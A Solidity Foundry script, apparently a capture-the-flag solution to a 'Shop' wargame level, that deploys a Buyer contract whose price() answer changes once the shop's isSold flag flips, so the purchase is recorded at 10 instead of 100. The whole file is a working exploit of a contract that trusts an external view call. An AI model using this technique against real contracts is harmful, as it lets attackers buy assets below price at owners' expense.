// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {Shop} from "src/Shop.sol";

contract Buyer {
    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function callBuy() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (!shop.isSold()) {
            return uint256(100);
        } else {
            return uint256(10);
        }
    }
}

contract Solve is Script {
    Buyer buyer;
    address instanceAddr = 0xc852512f054AE7E2eB94C7C9db24402d7E53a91F;

    function run() external {
        vm.startBroadcast();
        buyer = new Buyer(Shop(instanceAddr));
        buyer.callBuy();
        vm.stopBroadcast();
        console.log(Shop(instanceAddr).price());
    }
}
